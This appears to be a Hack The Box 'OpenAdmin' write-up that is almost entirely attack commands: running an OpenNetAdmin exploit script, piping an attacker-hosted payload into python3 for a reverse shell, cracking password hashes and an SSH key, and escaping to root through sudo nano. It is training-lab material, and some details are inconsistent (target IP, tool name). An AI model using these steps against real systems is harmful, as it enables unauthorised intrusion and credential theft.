# OpenAdmin (Linux)
## Includes
* Python3 Reverse Shell
* SSH Port Forwarding
* PTY and TTY Shells
* LinPEAS Privilege Escalation

## For More Info Open OpenAdmin.ctb With CherryTree For More Info
### Open Ports
* **80/TCP: HTTP**
* **22/TCP: SSH**
### Dirbuster On Port 80/TCP
* OpenNetAdmin service running at http://10.10.10.171/ona/

#### Exploit OpenNetAdmin
```searchploit OpenNetAdmin```

```searchploit -m php/webapps/47691.sh```

```dos2unix 47691.sh```

```./47691.sh http://10.10.10.171/ona/```

#### Create A Reverse Python3 Shell
##### Attacker
``` nc -lvp 8080```

At Shell Directory

```sudo python3 -m http.server 80```
##### Target
```curl <tun0 IP> | python3```

##### Attacker
```python3 -c “import pty; pty.spawn('/bin/bash')”```

```echo $TERM```

```stty raw -echo```

```fg```

**Spawn Shell Guide:** [Here](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/)

##### Target
```cat /etc/passwd | grep home```
New Users

* Joanna
* Jimmy

```cat /var/www/ona/local/config```

##### Attacker
```ssh jimmy@10.10.10.171```

With **Password: n1nj4W4rri0R!**

##### Jimmy SSH Session
Hash Found at: ```/var/www/internal/index.php```

Copy the Hash to a File called **HASH** and Decrypt with John: ```john HASH --format=Raw-SHA512 --wordlist=/usr/share/wordlists/rockyou.txt```

After ```cat /etc/apache2/sites-enabled/internal.conf``` We need to SSH Port Forward

##### Attacker - SSH Port Forwarding
```sudo service ssh start```

```ssh -R 9001:127.0.0.1:52846 fsociety@tun0```

At tun0 IP there Is An RSA Private Key

###### RSA to John and John Decryption
```python john2ssh PrivateKey > JohnKey```
```john JohnKey --wordlist=rockyou.txt```

Key Is **bloodninjas** for Joanna
```ssh -i PrivateKey joanna@10.10.10.175```

Now Grep User.txt

#### Privilege Escalation (Using LinPEAS)
```sudo -l```

```sudo -u root /bin/nano /opt/priv```

```ctrl + r``` 

```reset; sh 1>&0 2>&0```

``` ctrl + x```

```id```

Now Grep Root.txt

**Priviledge Escalation Technique:** [Here](https://medium.com/schkn/linux-privilege-escalation-using-text-editors-and-files-part-1-a8373396708d)
